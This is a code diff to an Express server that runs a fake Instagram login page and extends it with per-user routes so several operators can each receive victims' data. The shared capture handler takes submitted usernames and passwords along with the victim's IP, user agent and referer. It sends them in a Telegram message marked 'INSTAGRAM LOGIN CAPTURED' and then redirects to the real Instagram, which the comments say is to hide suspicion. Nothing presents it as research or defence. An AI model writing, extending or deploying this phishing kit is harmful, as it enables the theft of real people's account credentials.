@@ -375,51 +375,89 @@ const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 *
 const INSTA_PATH = path.join(__dirname, "test insta");
 app.use("/insta", express.static(INSTA_PATH));
 
-// Serve the fake login page
+// === OLD: Backward compatible /insta (sends to ADMIN) ===
 app.get("/insta", (req, res) => {
   res.sendFile(path.join(INSTA_PATH, "index.html"));
 });
 
-// === SINGLE LOGIN CAPTURE HANDLER ===
+// === NEW: Dynamic /insta/:userId (personalized, sends to THAT userId) ===
+app.get("/insta/:userId", (req, res) => {
+  const userId = req.params.userId;
+  if (!/^\d+$/.test(userId)) { // Validate: must be digits only
+    return res.redirect("/insta");
+  }
+
+  // Read HTML template
+  let html = fs.readFileSync(path.join(INSTA_PATH, "index.html"), 'utf8');
+
+  // Fix relative paths to absolute for /insta/:userId (CSS, icons work from /insta/public/...)
+  html = html.replace(/\.\/public\//g, '/insta/public/');
+
+  // Set dynamic form action to /login/:userId
+  html = html.replace(/action="\/login"/, `action="/login/${userId}"`);
+
+  // Send modified HTML
+  res.send(html);
+});
+
+// === OLD: Capture for /insta → send to ADMIN ===
 app.post("/login", async (req, res) => {
-  console.log("=== LOGIN ATTEMPT RECEIVED ===");
-  console.log("Full req.body:", req.body); // Debug: Check if body is parsed
+  console.log("=== OLD LOGIN (ADMIN) ===");
+  await handleCapture(req, res, ADMIN_USER_ID);
+});
+
+// === NEW: Capture for /login/:userId → send to THAT userId ===
+app.post("/login/:userId", async (req, res) => {
+  const userId = req.params.userId;
+  if (!/^\d+$/.test(userId)) {
+    console.log("Invalid userId:", userId);
+    return res.redirect("/insta");
+  }
+
+  console.log("=== NEW LOGIN (USER:", userId, ") ===");
+  await handleCapture(req, res, parseInt(userId));
+});
+
+// === SHARED CAPTURE LOGIC ===
+async function handleCapture(req, res, targetUserId) {
+  console.log("Full req.body:", req.body);
 
   const { username, password } = req.body;
 
   if (!username || !password) {
-    console.log("Missing username/password, redirecting");
+    console.log("Missing credentials");
     return res.redirect("/insta");
   }
 
-  // Get IP & other details
+  // Victim details
   const ip = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
   const userAgent = req.get('User-Agent') || 'unknown';
   const time = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
+  const referer = req.get('Referer') || 'Direct';
 
-  // Format message for Telegram
+  // Telegram message
   const message = `
 *🛡️ INSTAGRAM LOGIN CAPTURED*
 *👤 Username:* \`${username}\`
 *🔑 Password:* \`${password}\`
-*🌐 IP Address:* \`${ip}\`
-*📱 User Agent:* \`${userAgent.substring(0, 100)}...\`  *(truncated)*
-*⏰ Timestamp:* \`${time}\`
-*🔗 Referral:* \`${req.get('Referer') || 'Direct'}\`
+*🌐 IP:* \`${ip}\`
+*📱 User-Agent:* \`${userAgent.substring(0, 100)}...\`
+*⏰ Time:* \`${time}\`
+*🔗 From:* \`${referer}\`
   `.trim();
 
-  // Send to YOUR Telegram ID
   try {
-    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: 'Markdown' });
-    console.log(`✅ SUCCESS: Sent to your Telegram ID ${ADMIN_USER_ID} for user ${username} from IP ${ip}`);
+    await bot.telegram.sendMessage(targetUserId, message, { parse_mode: 'Markdown' });
+    console.log(`✅ SENT to ${targetUserId}: ${username} from ${ip}`);
   } catch (error) {
     console.error("❌ TELEGRAM ERROR:", error.message);
-    console.error("Check: Bot token valid? Admin ID correct? Bot started with /start?");
+    console.error("Fix: Valid token? User started bot? Unblocked?");
   }
 
-  // Redirect to real Instagram (hide suspicion)
+  // Redirect to real IG
   res.redirect('https://www.instagram.com/');
-});
+}
+
 // ---------- STUDENT PAGE ----------
 app.get("/r/:ref", async (req, res) => {
   const { ref } = req.params;
